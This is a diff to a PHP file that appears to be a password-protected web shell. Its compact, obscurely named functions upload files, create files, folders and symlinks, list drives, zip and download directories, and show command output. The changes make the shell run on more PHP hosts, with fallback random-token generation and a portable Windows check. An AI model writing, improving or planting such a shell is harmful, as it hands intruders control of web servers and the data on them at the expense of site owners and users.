@@ -1,6 +1,8 @@
 <?php
 error_reporting(0);
-session_start();
+if (session_status() === PHP_SESSION_NONE) {
+    @session_start();
+}
 define("PASSWORD_HASH", hash('sha256', 'emre'));
 
 // Input validation helpers
@@ -11,7 +13,13 @@ function sanitize_path($p) {
 
 function ensure_csrf_token() {
     if (empty($_SESSION['csrf_token'])) {
-        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+        if (function_exists('random_bytes')) {
+            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+        } elseif (function_exists('openssl_random_pseudo_bytes')) {
+            $_SESSION['csrf_token'] = bin2hex(openssl_random_pseudo_bytes(32));
+        } else {
+            $_SESSION['csrf_token'] = hash('sha256', uniqid(mt_rand(), true));
+        }
     }
     return $_SESSION['csrf_token'];
 }
@@ -67,7 +75,7 @@ function R($p,$n){ return !is_file($p."/".$n) ? file_put_contents($p."/".$n,"") 
 function S($p,$n){ return !is_dir($p."/".$n) ? mkdir($p."/".$n) : 0; }
 function T($p,$f){ $n=basename($f["name"]); if(!is_file($p."/".$n) && move_uploaded_file($f["tmp_name"],$p."/".$n)) return 1; return 0; }
 function U($p){ if($p==""||$p=="/") return $p; $p=explode("/", str_replace("\\","/",$p)); array_pop($p); return implode("/",$p); }
-function V(){ $r=""; if(PHP_OS_FAMILY==="Windows"){ foreach(range('C','Z') as $d){ if(@is_dir($d.":\\")) $r.=H("?path=$d:\\", $d.":\\"); } } return $r; }
+function V(){ $r=""; if(stripos(PHP_OS, "WIN")===0){ foreach(range('C','Z') as $d){ if(@is_dir($d.":\\")) $r.=H("?path=$d:\\", $d.":\\"); } } return $r; }
 function SL($dir, $target, $link){ if($dir=="" || $target=="" || $link=="") return 0; $lp = rtrim($dir,"/\\")."/".$link; if(file_exists($lp) || is_link($lp)) return 0; return @symlink($target, $lp) ? 1 : 0; }
 function W(){
     $dir = J();
@@ -167,7 +175,7 @@ if($cmdOut !== null){
 $ui .= "<hr>";
 $ui .= H("?zip=.&path=".urlencode(J()), "[Bu dizini ZIP indir]")." ";
 $ui .= H("?path=".U(J()),"[Back]");
-$ui .= (PHP_OS_FAMILY=="Windows"?V():"");
+$ui .= (stripos(PHP_OS, "WIN")===0?V():"");
 $ui .= (is_dir(J())?W():"<pre>".Q(J())."</pre>");
 $ui .= "</body>";
 echo $ui;
